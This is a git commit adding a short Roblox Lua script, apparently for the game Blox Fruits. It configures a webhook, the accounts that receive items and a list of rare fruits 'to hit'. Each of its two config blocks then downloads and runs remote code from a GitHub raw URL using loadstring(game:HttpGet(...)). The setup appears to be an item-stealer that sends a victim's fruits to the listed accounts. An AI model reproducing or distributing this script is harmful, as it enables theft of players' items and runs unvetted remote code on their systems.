bf71d1bc82f58a29cdb765ba1938c8c10c43f886
therealredz <mal362844@gmail.com>
2025-04-03 20:15:37 -0400

    Create redz.lua

---
+++ redz.lua
@@ -0,0 +1,14 @@
+Webhook = "" -- << Your Webhook
+Usernames = {"ytMarkian", "vintag992"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
+
+
+------------------
+
+Webhook = "" -- << Your Webhook
+Usernames = {"uruserhereorsmthidk", "somealtuserhere2"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Spirit-Spirit", "Gravity-Gravity", "T-Rex-T-Rex", "Mammoth-Mammoth", "Dough-Dough", "Dragon-Dragon", "Control-Control"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
